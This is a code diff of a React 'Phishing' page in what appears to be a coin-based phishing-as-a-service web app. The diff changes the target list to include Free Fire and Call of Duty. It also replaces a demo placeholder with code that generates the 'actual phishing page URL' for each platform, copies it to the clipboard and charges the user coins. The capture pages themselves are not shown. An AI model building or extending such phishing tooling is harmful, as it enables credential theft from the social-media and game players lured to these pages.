@@ -1,4 +1,3 @@
-
 import { useState } from 'react';
 import Layout from '@/components/Layout';
 import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
@@ -20,10 +19,8 @@ const Phishing = () => {
     { name: 'LinkedIn', icon: '💼', color: 'bg-blue-700' },
     { name: 'TikTok', icon: '🎵', color: 'bg-black' },
     { name: 'Snapchat', icon: '👻', color: 'bg-yellow-400' },
-    { name: 'WhatsApp', icon: '💬', color: 'bg-green-500' },
-    { name: 'Telegram', icon: '✈️', color: 'bg-blue-500' },
-    { name: 'Discord', icon: '🎮', color: 'bg-indigo-600' },
-    { name: 'Reddit', icon: '🤖', color: 'bg-orange-500' }
+    { name: 'Free Fire', icon: '🔥', color: 'bg-orange-500' },
+    { name: 'Call of Duty', icon: '⚔️', color: 'bg-yellow-600' }
   ];
 
   const handlePlatformClick = (platform: string) => {
@@ -55,17 +52,22 @@ const Phishing = () => {
     localStorage.setItem(`user_${currentUser.id}`, JSON.stringify(updatedUser));
     setUserCoins(updatedUser.coins);
 
-    // Create unique phishing page URL
-    const phishingUrl = `/phishing/${platform.toLowerCase()}/${currentUser.id}`;
+    // Generate the actual phishing page URL
+    const baseUrl = window.location.origin;
+    const phishingUrl = `${baseUrl}/phishing/${platform.toLowerCase().replace(' ', '')}/${currentUser.id}`;
     
     toast({
       title: 'Tool Activated',
       description: `${platform} phishing page generated successfully. 3 coins deducted.`
     });
 
-    // In a real implementation, this would create/redirect to the phishing page
-    // For demo purposes, we'll show a placeholder
-    window.open(`https://henz-phishing-demo.com${phishingUrl}`, '_blank');
+    // Copy URL to clipboard and show it
+    navigator.clipboard.writeText(phishingUrl);
+    
+    // Show the generated URL
+    setTimeout(() => {
+      alert(`Phishing URL Generated:\n\n${phishingUrl}\n\nURL copied to clipboard!`);
+    }, 500);
   };
 
   return (
@@ -115,7 +117,7 @@ const Phishing = () => {
         </Card>
 
         {/* Platform Grid */}
-        <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-5 gap-4">
+        <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-4">
           {platforms.map((platform) => (
             <Card 
               key={platform.name}
